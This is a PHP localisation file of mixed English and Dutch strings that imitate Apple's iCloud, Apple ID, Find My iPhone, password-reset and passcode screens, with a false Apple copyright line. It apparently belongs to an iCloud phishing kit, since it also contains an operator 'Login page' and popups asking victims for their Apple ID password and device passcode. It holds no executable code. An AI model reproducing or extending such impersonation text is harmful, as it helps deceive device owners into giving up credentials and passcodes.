<?php
/**
 * Created by PhpStorm.
 * User: mustapha
 * Date: 5/6/17
 * Time: 10:31 PM
 */

//- iCloud sign in page
$lang[ 'Singin_message' ] = "Sign in to iCloud";
$lang[ 'Setup_message' ] = "Setup Instructions";
$lang[ 'Help_message' ] = "Help and Support";
$lang[ 'Password_message' ] = "Password";
$lang[ 'RePassword_message' ] = "Re-Password";
$lang[ 'NewRePassword_message' ] = "New Re-Password";
$lang[ 'incorrect_message' ] = 'Your Apple ID or password was incorrect.';
$lang[ 'Keepsigin_message' ] = "Houd me ingelogd";
$lang[ 'Forgotpassword_message' ] = "Apple ID of wachtwoord vergeten?";
$lang[ 'Forgotpassword2_message' ] = "Forgot password?";
$lang[ 'DonthaveanAppleid_message' ] = "Don’t have an Apple ID?";
$lang[ 'Createyoursnow_message' ] = "Create yours now";
$lang[ 'Checkactivation_message' ] = "Check Activation Lock Status";
$lang[ 'Systemstatus_message' ] = "System Status";
$lang[ 'Privacy_message' ] = "Privacybeleid";
$lang[ 'Terms_message' ] = "Voorwaarden";
$lang[ 'Copyrights_message' ] = 'Copyright © ' . date( 'Y' ) . ' Apple Inc. Alle rechten voorbehouden.';
$lang[ 'iCloudsettings_message' ] = "iCloud Settings";
$lang[ 'Signout_message' ] = "Loga uit";
$lang[ 'VerificationFailed_message' ] = "Verificatie mislukt";
$lang[ 'OK_message' ] = "OK";

//-- iCloud apps
$lang[ 'Reminders_message' ] = "Reminders";
$lang[ 'Notes_message' ] = "Notes";
$lang[ 'iCloudDrive_message' ] = "iCloud Drive";
$lang[ 'Photos_message' ] = "Photos";
$lang[ 'Contacts_message' ] = "Contacts";
$lang[ 'Mail_message' ] = "Mail";
$lang[ 'Settings_message' ] = "Settings";
$lang[ 'FindMyiPhone_message' ] = "Find My iPhone";
$lang[ 'Keynote_message' ] = "Keynote";
$lang[ 'Numbers_message' ] = "Numbers";
$lang[ 'FindFriends_message' ] = "Find Friends";
$lang[ 'Pages_message' ] = "Pages";

//- Maps connect Page
$lang[ 'Help_message' ] = "Help";
$lang[ 'Createone_message' ] = "Create one";
$lang[ 'ForgotIDorPassword_message' ] = "Forgot ID or Password?";

//- iTunes Connect Page
$lang[ 'iTunesConnect_message' ] = "iTunes Connect";
$lang[ 'Rememberme_message' ] = "Onthoud mij";

//- Apple ID Page
$lang[ 'SignIn_message' ] = "Sign In";
$lang[ 'CreateYourAppleID_message' ] = "Create Your Apple ID";
$lang[ 'FAQ_message' ] = "FAQ";
$lang[ 'ManageyourAppleaccount_message' ] = "Manage your Apple account";
$lang[ 'YourAppleIDorpasswordwasincorrect_message' ] = "Your Apple ID or password was incorrect";
$lang[ 'YouraccountforeverythingApple_message' ] = "Your account for everything Apple";
$lang[ 'AsingleAppleIDandpasswordgivesyouaccesstoallAppleservices_message' ] = "A single Apple ID and password gives you access to all Apple services";
$lang[ 'LearnmoreaboutAppleID_message' ] = "Learn more about Apple ID";
$lang[ 'TermsofUse_message' ] = "Terms of Use";
$lang[ 'AppleOnlineStore_message' ] = "Apple Online Store";
$lang[ 'visitan_message' ] = "visit an";
$lang[ 'AppleRetailStore_message' ] = "Apple Retail Store";
$lang[ 'orfinda_message' ] = "or find a";
$lang[ 'reseller_message' ] = "reseller";
$lang[ 'Shopthe_message' ] = "Shop the";
$lang[ 'AppleInfo_message' ] = "Apple Info";
$lang[ 'SiteMap_message' ] = "Site Map";
$lang[ 'HotNews_message' ] = "Hot News";
$lang[ 'RSSFeeds_message' ] = "RSS Feeds";
$lang[ 'ContactUs_message' ] = "Contact Us";
$lang[ 'Search_message' ] = "Search";

//- Compass Page
$lang[ 'FindMyiPhone_message' ] = "Zoek mijn iPhone";
$lang[ 'Sign-InRequired_message' ] = "Sign-In Required";
$lang[ 'Not_message' ] = "Not";


//- Reset Password Page
$lang[ 'ResetPassword_message' ] = "Reset Password";
$lang[ 'PasswordChanged_message' ] = "Password Changed";
$lang[ 'YourAppleIDpasswordfor_message' ] = "Your Apple ID password for";
$lang[ 'has_message' ] = "has";
$lang[ 'beenchanged_message' ] = "been changed";
$lang[ 'SignintoyourAppleIDaccountpagenowto_message' ] = "Sign in to your Apple ID account page now to";
$lang[ 'reviewyouraccountinformation_message' ] = "review your account information";
$lang[ 'GotoYourAccount_message' ] = "Go to Your Account";
$lang[ 'Enteranewpassword_message' ] = "Enter a new password";
$lang[ 'oldpassword_message' ] = "old password";
$lang[ 'newpassword_message' ] = "new password";
$lang[ 'confirmpassword_message' ] = "confirm password";
$lang[ 'Yourpasswordmusthave_message' ] = "Your password must have";
$lang[ 'ormorecharacters_message' ] = "8 or more characters";
$lang[ 'Upperlowercaseletters_message' ] = "Upper & lowercase letters";
$lang[ 'Atleastonenumber_message' ] = "At least one number";
$lang[ 'Strength_message' ] = "Strength";
$lang[ 'Avoidpasswordsthatareeasytoguessorusedwithotherwebsites_message' ] = "Avoid passwords that are easy to guess or used with other websites";
$lang[ 'YourAppleIDoroldpasswordwasincorrect_message' ] = "Your Apple ID or old password was incorrect";
$lang[ '_message' ] = "";
$lang[ '_message' ] = "";

//-- Login page
$lang[ 'Signsession_message' ] = "Sign in to start your session";
$lang[ 'Alert_message' ] = "Alert";
$lang[ 'Username_message' ] = "Username";
$lang[ 'Password_message' ] = "Password";
$lang[ 'Signin_message' ] = "Sign In";
$lang[ 'User_message' ] = "User";

//- General Lang
$lang[ 'appleid_message' ] = "Apple ID";
$lang[ 'Cancel_message' ] = "Annuleer";
$lang[ 'required_message' ] = "Required";

//- Find my iphone page
$lang[ 'Alldevices_message' ] = "All Devices";
$lang[ 'Locating_message' ] = "Locating";
$lang[ 'Alldevicesoffline_message' ] = "All Devices Offline";
$lang[ 'Nolocations_message' ] = "No locations can be shown because all your devices are offline.";
$lang[ 'hourago_message' ] = "1 hour ago";
$lang[ 'Playsound_message' ] = "Speel geluid af";
$lang[ 'Lostmode_message' ] = "Lost Mode";
$lang[ 'EraseiPhone_message' ] = "Wis";
$lang[ 'Notifyfound_message' ] = "Notify me when found";
$lang[ 'Removeaccount_message' ] = "Remove from Account";
$lang[ 'Offline_message' ] = "Offline";

//- Passcode Page
$lang['access'] = "Need to find your device? Get quick access to:";
$lang['enterpasscode'] = "Enter passcode to contiune.";

//- New Fmi Template
$lang['manageappleid'] = "Beheer je Apple-account";
$lang['No_Devices'] = "No Devices";
$lang['fmiSetup'] = "Set up your iCloud account on an iPhone, iPad, iPod touch or Mac to use Find My iPhone.";
$lang['MY_DEVICES'] = "MY DEVICES";
$lang['REFRESH'] = "REFRESH";
$lang['Seen_just_now'] = "Seen just now";
$lang['Old_Location'] = "Old Location";


//- FMI PopUp

$lang['Enter_the_password_Apple'] = "Voer het wachtwoord in voor de Apple ID";
$lang['Apple_ID_Sign_Requested'] = "Log in bij iCloud";
$lang['Turn_On_Send_Last_Location'] = "Schakel 'Stuur laatste locatie' in";
$lang['Allow_Find_My_iPhone_to_store_the_last'] = "Sta toe dat 'Zoek mijn iPhone' de laatst bekende locatie van deze iPad opslaat voor maximaal 24 uur nadat de batterij leeg is.";
$lang['Not_Now'] = "Niet nu";
$lang['Turn_On'] = "Schakel in";
$lang['Your_Apple_ID_or_password_is_incorrect'] = "Apple ID of wachtwoord vergeten?";
$lang['Action'] = "Taken";
$lang['Updating_location'] = "Locatie bijwerken.";
$lang['Try_Again'] = "Try Again";
